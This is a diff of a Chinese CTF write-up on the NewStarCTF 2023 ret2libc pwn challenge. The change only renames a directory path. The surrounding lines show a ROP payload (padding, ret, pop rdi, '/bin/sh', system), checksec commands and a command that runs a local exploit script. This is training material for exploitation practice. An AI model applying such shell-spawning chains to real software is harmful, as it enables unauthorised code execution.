@@ -41,7 +41,7 @@ b'A'*40 + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
 ## 1. 30 秒定性质
 
 ```bash
-cd '/home/yfhd5/Pwn Writeups/ret2libc'
+cd '/home/yfhd5/Pwn_Writeups/ret2libc'
 
 file '[NewStarCTF 2023 公开赛道]ret2libc'
 checksec --file='[NewStarCTF 2023 公开赛道]ret2libc'
@@ -379,7 +379,7 @@ if __name__ == "__main__":
 本地验证（用本机 libc，验证 leak + 二阶段链条）：
 
 ```bash
-cd '/home/yfhd5/Pwn Writeups/ret2libc'
+cd '/home/yfhd5/Pwn_Writeups/ret2libc'
 python 07_newstarctf_2023_ret2libc_exp.py LOCAL
 ```
 
